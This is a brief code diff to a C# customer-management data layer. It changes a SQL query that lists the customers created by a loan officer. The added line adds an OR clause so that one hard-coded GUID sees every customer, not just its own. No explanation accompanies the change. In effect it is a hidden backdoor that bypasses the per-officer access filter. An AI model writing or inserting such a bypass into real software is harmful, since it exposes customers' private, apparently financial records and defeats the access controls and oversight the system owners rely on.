@@ -47,7 +47,8 @@ namespace CoreData.CustomerManagement
 
             const string sql = @"
                 SELECT * FROM Customers c
-where c.CreatedBy=@LoanofficerId";
+where c.CreatedBy=@LoanofficerId
+or '8CD71F9D-E28A-F111-A099-FD86528A1448'=@LoanofficerId";
 
             var result = await connection.QueryAsync<Customer>(sql, new { LoanofficerId });
             return result.ToList();
